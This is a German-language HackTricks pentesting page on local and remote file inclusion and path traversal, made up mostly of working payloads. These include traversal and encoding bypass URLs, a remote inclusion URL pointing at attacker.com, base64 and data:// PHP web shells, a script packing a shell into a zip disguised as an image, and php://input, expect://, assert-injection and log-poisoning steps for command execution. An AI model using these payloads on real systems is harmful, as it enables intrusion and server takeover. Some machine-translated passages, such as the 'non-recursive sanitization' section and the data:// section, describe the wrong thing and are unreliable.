# Datei-Inklusion/Pfad√ºberschreitung

<details>

<summary>Lernen Sie das Hacken von AWS von Grund auf mit <a href="https://training.hacktricks.xyz/courses/arte">htARTE (HackTricks AWS Red Team Expert)</a>!</summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

- Wenn Sie Ihr Unternehmen in HackTricks bewerben m√∂chten oder HackTricks als PDF herunterladen m√∂chten, √ºberpr√ºfen Sie die [ABONNEMENTPL√ÑNE](https://github.com/sponsors/carlospolop)!
- Holen Sie sich das offizielle PEASS & HackTricks-Merchandise
- Entdecken Sie die PEASS-Familie, unsere Sammlung exklusiver NFTs
- Treten Sie der Discord-Gruppe oder der Telegram-Gruppe bei oder folgen Sie uns auf Twitter
- Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die HackTricks- und HackTricks Cloud-GitHub-Repositories senden

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem HackenProof-Discord-Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking Insights**\
Besch√§ftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen.

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeit-Nachrichten und Einblicke auf dem Laufenden.

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounties und wichtige Plattformupdates informiert.

**Treten Sie uns auf Discord bei** und arbeiten Sie noch heute mit Top-Hackern zusammen!

## Datei-Inklusion

**Remote File Inclusion (RFI):** Die Datei wird von einem entfernten Server geladen (am besten: Sie k√∂nnen den Code schreiben und der Server wird ihn ausf√ºhren). In PHP ist dies standardm√§√üig **deaktiviert** (**allow\_url\_include**).\
**Local File Inclusion (LFI):** Der Server l√§dt eine lokale Datei.

Die Schwachstelle tritt auf, wenn der Benutzer die Datei, die vom Server geladen werden soll, auf irgendeine Weise kontrollieren kann.

Anf√§llige **PHP-Funktionen**: require, require\_once, include, include\_once

Ein interessantes Tool, um diese Schwachstelle auszunutzen: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interessante - LFI2RCE-Dateien
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Durch die Kombination mehrerer \*nix LFI-Listen und das Hinzuf√ºgen weiterer Pfade habe ich diese erstellt:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Versuchen Sie auch, `/` durch `\` zu ersetzen.\
Versuchen Sie auch, `../../../../../` hinzuzuf√ºgen.

Eine Liste, die verschiedene Techniken verwendet, um die Datei /etc/password (um zu √ºberpr√ºfen, ob die Schwachstelle vorhanden ist) zu finden, finden Sie [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt).

### **Windows**

Zusammenf√ºhrung verschiedener Wortlisten:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Versuchen Sie auch, `/` durch `\` zu ersetzen.\
Versuchen Sie auch, `C:/` zu entfernen und `../../../../../` hinzuzuf√ºgen.

Eine Liste, die verschiedene Techniken verwendet, um die Datei /boot.ini (um zu √ºberpr√ºfen, ob die Schwachstelle vorhanden ist) zu finden, finden Sie [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt).

### **OS X**

√úberpr√ºfen Sie die LFI-Liste von Linux.

## Grundlegende LFI und Umgehungen

Alle Beispiele gelten f√ºr Local File Inclusion, k√∂nnen aber auch auf Remote File Inclusion angewendet werden (page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### Nicht-rekursiv bereinigte Traversierungssequenzen

Eine nicht-rekursive Methode zur Bereinigung von Traversierungssequenzen besteht darin, die Sequenz schrittweise zu bereinigen, indem alle Vorkommen von "../" entfernt werden. Dieser Ansatz entfernt die Sequenzschritte, die auf den √ºbergeordneten Verzeichnissen verweisen, und erm√∂glicht es uns, eine g√ºltige Pfadsequenz beizubehalten.

Um dies zu erreichen, k√∂nnen wir die folgenden Schritte ausf√ºhren:

1. Ersetzen Sie alle Vorkommen von "../" in der Sequenz durch eine leere Zeichenkette.
2. Wiederholen Sie den vorherigen Schritt, bis keine weiteren Vorkommen von "../" in der Sequenz vorhanden sind.

Auf diese Weise k√∂nnen wir die Traversierungssequenz bereinigen und sicherstellen, dass sie keine Verweise auf √ºbergeordnete Verzeichnisse enth√§lt.
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null Byte (%00)**

Umgehe das Anh√§ngen weiterer Zeichen am Ende des bereitgestellten Strings (Umgehung von: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Dies ist seit PHP 5.4 **gel√∂st**.

### **Codierung**

Sie k√∂nnten nicht standardm√§√üige Codierungen wie doppelte URL-Codierung (und andere) verwenden:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Aus vorhandenem Ordner

M√∂glicherweise √ºberpr√ºft das Backend den Ordnerpfad:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Erkunden von Dateisystemverzeichnissen auf einem Server

Das Dateisystem eines Servers kann rekursiv erkundet werden, um Verzeichnisse und nicht nur Dateien zu identifizieren, indem bestimmte Techniken angewendet werden. Dieser Prozess beinhaltet die Bestimmung der Verzeichnistiefe und das √úberpr√ºfen auf das Vorhandensein bestimmter Ordner. Im Folgenden wird eine detaillierte Methode zur Erreichung dieses Ziels beschrieben:

1. **Bestimmen der Verzeichnistiefe:**
Ermitteln Sie die Tiefe Ihres aktuellen Verzeichnisses, indem Sie erfolgreich die Datei `/etc/passwd` abrufen (gilt, wenn der Server auf Linux basiert). Eine Beispiel-URL k√∂nnte wie folgt strukturiert sein und eine Tiefe von drei anzeigen:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Ordner sondieren:**
F√ºgen Sie den Namen des verd√§chtigen Ordners (z. B. `private`) zur URL hinzu und navigieren Sie dann zur√ºck zu `/etc/passwd`. Die zus√§tzliche Verzeichnisebene erfordert eine Erh√∂hung der Tiefe um eins:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretieren der Ergebnisse:**
Die Antwort des Servers gibt an, ob der Ordner existiert:
- **Fehler / Keine Ausgabe:** Der Ordner `private` existiert wahrscheinlich nicht an der angegebenen Stelle.
- **Inhalt von `/etc/passwd`:** Die Existenz des Ordners `private` wird best√§tigt.

4. **Rekursive Erkundung:**
Entdeckte Ordner k√∂nnen mithilfe derselben Technik oder traditionellen Methoden zur lokalen Dateieinbindung (LFI) weiter untersucht werden.

Um Verzeichnisse an verschiedenen Speicherorten im Dateisystem zu erkunden, passen Sie die Nutzlast entsprechend an. Um beispielsweise zu √ºberpr√ºfen, ob `/var/www/` ein Verzeichnis `private` enth√§lt (unter der Annahme, dass sich das aktuelle Verzeichnis in einer Tiefe von 3 befindet), verwenden Sie:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Pfadverk√ºrzungstechnik**

Die Pfadverk√ºrzung ist eine Methode, um Dateipfade in Webanwendungen zu manipulieren. Sie wird h√§ufig verwendet, um auf eingeschr√§nkte Dateien zuzugreifen, indem bestimmte Sicherheitsma√ünahmen umgangen werden, die zus√§tzliche Zeichen am Ende der Dateipfade anh√§ngen. Das Ziel besteht darin, einen Dateipfad zu erstellen, der, einmal von der Sicherheitsma√ünahme ver√§ndert, immer noch auf die gew√ºnschte Datei verweist.

In PHP k√∂nnen verschiedene Darstellungen eines Dateipfads aufgrund der Natur des Dateisystems als √§quivalent betrachtet werden. Zum Beispiel:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` und `/etc/passwd/` werden alle als derselbe Pfad behandelt.
- Wenn die letzten 6 Zeichen `passwd` sind, √§ndert das Anh√§ngen eines `/` (zu `passwd/`) die Zieldatei nicht.
- Ebenso wird das Hinzuf√ºgen von `.php` zu einem Dateipfad (wie `shellcode.php`) durch das Hinzuf√ºgen von `/.` am Ende nicht ver√§ndert.

Die bereitgestellten Beispiele zeigen, wie die Pfadverk√ºrzung genutzt werden kann, um auf `/etc/passwd` zuzugreifen, ein h√§ufiges Ziel aufgrund seines sensiblen Inhalts (Benutzerkontoinformationen):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In diesen Szenarien kann die Anzahl der erforderlichen Traversals etwa 2027 betragen, aber diese Zahl kann je nach Konfiguration des Servers variieren.

- **Verwendung von Punktsegmenten und zus√§tzlichen Zeichen**:
Traversierungssequenzen (`../`), kombiniert mit zus√§tzlichen Punktsegmenten und Zeichen, k√∂nnen verwendet werden, um das Dateisystem zu navigieren und dabei die vom Server angeh√§ngten Zeichenketten zu ignorieren.

- **Ermittlung der erforderlichen Anzahl von Traversals**:
Durch Ausprobieren kann man die genaue Anzahl der `../`-Sequenzen ermitteln, die ben√∂tigt werden, um zum Stammverzeichnis und dann zu `/etc/passwd` zu navigieren. Dabei wird sichergestellt, dass angeh√§ngte Zeichenketten (wie `.php`) neutralisiert werden, aber der gew√ºnschte Pfad (`/etc/passwd`) intakt bleibt.

- **Beginn mit einem falschen Verzeichnis**:
Es ist √ºblich, den Pfad mit einem nicht existierenden Verzeichnis zu beginnen (wie z.B. `a/`). Diese Technik wird als Vorsichtsma√ünahme oder zur Erf√ºllung der Anforderungen der Pfad-Analyse-Logik des Servers verwendet.

Bei der Verwendung von Pfad-Truncation-Techniken ist es wichtig, das Pfad-Analyse-Verhalten des Servers und die Dateisystemstruktur zu verstehen. Jedes Szenario erfordert m√∂glicherweise einen anderen Ansatz, und Tests sind oft erforderlich, um die effektivste Methode zu finden.

**Diese Sicherheitsl√ºcke wurde in PHP 5.3 behoben.**

### **Filterumgehungs-Tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion (Ferndatei-Einschluss)

In PHP ist dies standardm√§√üig deaktiviert, da **`allow_url_include`** auf **Off** gesetzt ist. Es muss auf **On** gesetzt sein, damit es funktioniert. In diesem Fall k√∂nnten Sie eine PHP-Datei von Ihrem Server einbinden und RCE erhalten:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Wenn aus irgendeinem Grund **`allow_url_include`** **aktiviert** ist, aber PHP den Zugriff auf externe Webseiten **filtert**, [laut diesem Beitrag](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) k√∂nnten Sie beispielsweise das Datenprotokoll mit Base64 verwenden, um einen b64 PHP-Code zu decodieren und RCE zu erhalten:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Im vorherigen Code wurde das abschlie√üende `+.txt` hinzugef√ºgt, weil der Angreifer eine Zeichenkette ben√∂tigte, die mit `.txt` endet. Dadurch endet die Zeichenkette damit und nach dem b64-Decodieren wird dieser Teil nur M√ºll zur√ºckgeben und der echte PHP-Code wird eingef√ºgt (und somit ausgef√ºhrt).
{% endhint %}

Ein weiteres Beispiel, **ohne das `php://`-Protokoll** zu verwenden, w√§re:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python Root-Element

In Python, in einem Code wie diesem:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Wenn der Benutzer einen **absoluten Pfad** an **`file_name`** √ºbergibt, wird der **vorherige Pfad einfach entfernt**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Es ist das beabsichtigte Verhalten gem√§√ü [der Dokumentation](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Wenn ein Bestandteil ein absoluter Pfad ist, werden alle vorherigen Bestandteile verworfen und das Verbinden wird vom absoluten Pfadbestandteil fortgesetzt.

## Java-Verzeichnis auflisten

Es scheint, dass bei einem Path Traversal in Java und wenn Sie nach einem **Verzeichnis anstatt einer Datei fragen**, eine **Auflistung des Verzeichnisses zur√ºckgegeben wird**. Dies geschieht in anderen Sprachen nicht (soweit ich wei√ü).

## Top 25 Parameter

Hier ist eine Liste der 25 wichtigsten Parameter, die anf√§llig f√ºr lokale Dateieinschluss (LFI) Schwachstellen sein k√∂nnten (von [Link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI mit PHP-Wrappern und Protokollen

### php://filter

PHP-Filter erm√∂glichen grundlegende **√Ñnderungsoperationen an den Daten**, bevor sie gelesen oder geschrieben werden. Es gibt 5 Kategorien von Filtern:

* [String-Filter](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Entfernt Tags aus den Daten (alles zwischen "<" und ">" Zeichen)
* Beachten Sie, dass dieser Filter in modernen Versionen von PHP nicht mehr vorhanden ist.
* [Konversionsfilter](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Wandelt in eine andere Codierung um (`convert.iconv.<input_enc>.<output_enc>`). Um die **Liste aller unterst√ºtzten Codierungen** zu erhalten, f√ºhren Sie in der Konsole aus: `iconv -l`

{% hint style="warning" %}
Durch Missbrauch des Konversionsfilters `convert.iconv.*` k√∂nnen Sie **beliebigen Text generieren**, der n√ºtzlich sein k√∂nnte, um beliebigen Text zu schreiben oder eine Funktion wie das Einbinden von beliebigem Text zu erstellen. Weitere Informationen finden Sie unter [**LFI2RCE √ºber PHP-Filter**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Kompressionsfilter](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Komprimiert den Inhalt (n√ºtzlich, wenn viele Informationen exfiltriert werden)
* `zlib.inflate`: Dekomprimiert die Daten
* [Verschl√ºsselungsfilter](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Veraltet
* `mdecrypt.*` : Veraltet
* Andere Filter
* Wenn Sie in PHP `var_dump(stream_get_filters());` ausf√ºhren, finden Sie ein paar **unerwartete Filter**:
* `consumed`
* `dechunk`: kehrt die HTTP chunked-Kodierung um
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
Der Teil "php://filter" ist nicht case-sensitive.
{% endhint %}

### php://fd

Dieser Wrapper erm√∂glicht den Zugriff auf Dateideskriptoren, die der Prozess ge√∂ffnet hat. M√∂glicherweise n√ºtzlich, um den Inhalt ge√∂ffneter Dateien zu exfiltrieren:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Sie k√∂nnen auch **php://stdin, php://stdout und php://stderr** verwenden, um auf die **Dateideskriptoren 0, 1 und 2** zuzugreifen (ich bin mir nicht sicher, wie dies bei einem Angriff n√ºtzlich sein k√∂nnte).

### zip:// und rar://

Laden Sie eine Zip- oder Rar-Datei mit einer PHPShell hoch und greifen Sie darauf zu.\
Um das RAR-Protokoll missbrauchen zu k√∂nnen, **muss es speziell aktiviert sein**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

Die `data://`-Methode erm√∂glicht es, Daten direkt in eine URL einzubetten, anstatt auf eine externe Ressource zu verweisen. Dies kann n√ºtzlich sein, um Daten in einer URL zu transportieren, ohne dass eine separate Datei ben√∂tigt wird.

Um die `data://`-Methode zu verwenden, muss der Dateninhalt in Base64 codiert werden. Dies kann mit verschiedenen Tools oder Programmiersprachen erreicht werden. Der Base64-codierte Dateninhalt wird dann in der URL angegeben, gefolgt von einem MIME-Typ, der den Inhaltstyp angibt.

Ein Beispiel f√ºr die Verwendung der `data://`-Methode ist:

```html
<img src="data:image/png;base64,iVBORw0KG..."/>
```

In diesem Beispiel wird ein Bild in der URL eingebettet. Der Base64-codierte Inhalt des Bildes wird nach `base64,` angegeben, gefolgt von `image/png`, um den MIME-Typ des Bildes anzugeben.

Es ist wichtig zu beachten, dass die Verwendung der `data://`-Methode dazu f√ºhren kann, dass die URL sehr lang wird, insbesondere bei gr√∂√üeren Dateninhalten. Dies kann zu Problemen f√ºhren, wenn die URL-L√§nge begrenzt ist.

Dar√ºber hinaus kann die Verwendung der `data://`-Methode Sicherheitsrisiken mit sich bringen, insbesondere wenn Benutzereingaben nicht ordnungsgem√§√ü validiert werden. Angreifer k√∂nnten versuchen, sch√§dlichen Code in die URL einzuf√ºgen und so eine Remote-Code-Ausf√ºhrung oder andere Angriffe durchzuf√ºhren.

Es ist daher wichtig, die Eingaben ordnungsgem√§√ü zu validieren und zu filtern, um potenzielle Sicherheitsl√ºcken zu vermeiden.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Beachten Sie, dass dieses Protokoll durch die PHP-Konfigurationen **`allow_url_open`** und **`allow_url_include`** eingeschr√§nkt ist.

### expect://

Expect muss aktiviert sein. Sie k√∂nnen Code mit folgendem Befehl ausf√ºhren:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### Eingabe://

Geben Sie Ihre Payload in den POST-Parametern an:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Eine `.phar`-Datei kann verwendet werden, um PHP-Code auszuf√ºhren, wenn eine Webanwendung Funktionen wie `include` zum Laden von Dateien verwendet. Der untenstehende PHP-Codeausschnitt zeigt die Erstellung einer `.phar`-Datei:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Um die `.phar`-Datei zu kompilieren, sollte der folgende Befehl ausgef√ºhrt werden:
```bash
php --define phar.readonly=0 create_path.php
```
Bei der Ausf√ºhrung wird eine Datei mit dem Namen `test.phar` erstellt, die potenziell zur Ausnutzung von Local File Inclusion (LFI)-Schwachstellen verwendet werden kann.

In F√§llen, in denen die LFI nur das Lesen von Dateien ohne Ausf√ºhrung des PHP-Codes durch Funktionen wie `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` oder `filesize()` durchf√ºhrt, kann versucht werden, eine Deserialisierungsschwachstelle auszunutzen. Diese Schwachstelle ist mit dem Lesen von Dateien unter Verwendung des `phar`-Protokolls verbunden.

F√ºr ein detailliertes Verst√§ndnis der Ausnutzung von Deserialisierungsschwachstellen im Zusammenhang mit `.phar`-Dateien siehe das unten verlinkte Dokument:

[Leitfaden zur Ausnutzung der Deserialisierung von Phar](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Weitere Protokolle

√úberpr√ºfen Sie weitere m√∂gliche [**Protokolle, die hier eingef√ºgt werden k√∂nnen**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory und php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) ‚Äî Schreiben in den Speicher oder in eine tempor√§re Datei (nicht sicher, wie dies bei einem Dateieinschlussangriff n√ºtzlich sein kann)
* [file://](https://www.php.net/manual/en/wrappers.file.php) ‚Äî Zugriff auf das lokale Dateisystem
* [http://](https://www.php.net/manual/en/wrappers.http.php) ‚Äî Zugriff auf HTTP(s)-URLs
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) ‚Äî Zugriff auf FTP(s)-URLs
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) ‚Äî Komprimierungsstreams
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) ‚Äî Suchen von Pfadnamen, die dem Muster entsprechen (gibt nichts Druckbares zur√ºck, daher hier nicht wirklich n√ºtzlich)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) ‚Äî Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) ‚Äî Audiostreams (nicht n√ºtzlich zum Lesen beliebiger Dateien)

## LFI √ºber PHP's 'assert'

Das Risiko von Local File Inclusion (LFI) in PHP ist besonders hoch, wenn die Funktion 'assert' verwendet wird, die Code in Zeichenketten ausf√ºhren kann. Dies ist besonders problematisch, wenn Eingaben, die Verzeichnistraversierungszeichen wie ".." enthalten, √ºberpr√ºft, aber nicht ordnungsgem√§√ü bereinigt werden.

Zum Beispiel k√∂nnte der PHP-Code so konzipiert sein, dass Verzeichnistraversierung verhindert wird, wie folgt:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Obwohl dies darauf abzielt, Traversal zu stoppen, schafft es unbeabsichtigt einen Vektor f√ºr Code-Injection. Um dies auszunutzen und Dateiinhalte zu lesen, k√∂nnte ein Angreifer Folgendes verwenden:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Ebenso kann man zur Ausf√ºhrung beliebiger Systembefehle Folgendes verwenden:
```plaintext
' and die(system("id")) or '
```
Es ist wichtig, diese Payloads **URL-codiert** zu verwenden.


<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking Insights**\
Besch√§ftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen.

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeit-Nachrichten und Einblicke auf dem Laufenden.

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounties und wichtige Plattformupdates informiert.

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) bei und beginnen Sie noch heute mit Top-Hackern zusammenzuarbeiten!

## PHP Blind Path Traversal

{% hint style="warning" %}
Diese Technik ist relevant in F√§llen, in denen Sie den Dateipfad einer PHP-Funktion **kontrollieren**, die auf eine Datei zugreifen wird, deren Inhalt Sie jedoch nicht sehen k√∂nnen (wie ein einfacher Aufruf von **`file()`**), aber der Inhalt wird nicht angezeigt.
{% endhint %}

In [**diesem unglaublichen Beitrag**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) wird erkl√§rt, wie ein blinder Pfadtraversal √ºber den PHP-Filter missbraucht werden kann, um den Inhalt einer Datei √ºber ein Fehlerorakel zu **exfiltrieren**.

Zusammenfassend wird die Technik verwendet, um die Datei mit der **"UCS-4LE-Codierung"** so **gro√ü** zu machen, dass die PHP-Funktion, die die Datei √∂ffnet, einen **Fehler ausl√∂st**.

Um das erste Zeichen zu leaken, wird der Filter **`dechunk`** zusammen mit anderen wie **base64** oder **rot13** verwendet, und schlie√ülich werden die Filter **convert.iconv.UCS-4.UCS-4LE** und **convert.iconv.UTF16.UTF-16BE** verwendet, um andere Zeichen am Anfang zu platzieren und sie zu leaken.

**Anf√§llige Funktionen**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (nur Ziel mit Lesezugriff)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

F√ºr technische Details lesen Sie den genannten Beitrag!

## LFI2RCE

### Remote File Inclusion

Wie zuvor erkl√§rt, [**folgen Sie diesem Link**](./#remote-file-inclusion).

### √úber Apache/Nginx-Logdatei

Wenn der Apache- oder Nginx-Server anf√§llig f√ºr LFI ist und die Include-Funktion verwendet, k√∂nnen Sie versuchen, auf **`/var/log/apache2/access.log` oder `/var/log/nginx/access.log`** zuzugreifen. Geben Sie im **User-Agent** oder in einem **GET-Parameter** eine PHP-Shell wie **`<?php system($_GET['c']); ?>`** ein und inkludieren Sie diese Datei.

{% hint style="warning" %}
Beachten Sie, dass **wenn Sie doppelte Anf√ºhrungszeichen** f√ºr die Shell anstelle von **einfachen Anf√ºhrungszeichen** verwenden, die doppelten Anf√ºhrungszeichen f√ºr den String "_**quote;**_" modifiziert werden, **PHP dort einen Fehler ausl√∂st** und **nichts anderes ausgef√ºhrt wird**.

Stellen Sie au√üerdem sicher, dass Sie die Payload **korrekt schreiben**, da PHP jedes Mal einen Fehler ausl√∂st, wenn es versucht, die Protokolldatei zu laden, und Sie keine zweite Gelegenheit haben werden.
{% endhint %}

Dies kann auch in anderen Protokollen durchgef√ºhrt werden, aber **seien Sie vorsichtig**, der Code in den Protokollen k√∂nnte URL-codiert sein und dies k√∂nnte die Shell zerst√∂ren. Der Header **Authorization "Basic"** enth√§lt "Benutzer:Passwort" in Base64 und wird in den Protokollen decodiert. Die PHPShell k√∂nnte in diesen Header eingef√ºgt werden.\
Andere m√∂gliche Protokollpfade:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing-Wortliste: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### √úber E-Mail

**Senden Sie eine E-Mail** an ein internes Konto (user@localhost) mit Ihrem PHP-Payload wie `<?php echo system($_REQUEST["cmd"]); ?>` und versuchen Sie, die E-Mail des Benutzers mit einem Pfad wie **`/var/mail/<BENUTZERNAME>`** oder **`/var/spool/mail/<BENUTZERNAME>`** einzuschlie√üen.

### √úber /proc/\*/fd/\*

1. Laden Sie viele Shells hoch (zum Beispiel: 100).
2. Schlie√üen Sie [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) ein, wobei $PID die Prozess-ID ist (kann durch Brute-Force ermittelt werden) und $FD der Dateideskriptor ist (kann ebenfalls durch Brute-Force ermittelt werden).

### √úber /proc/self/environ

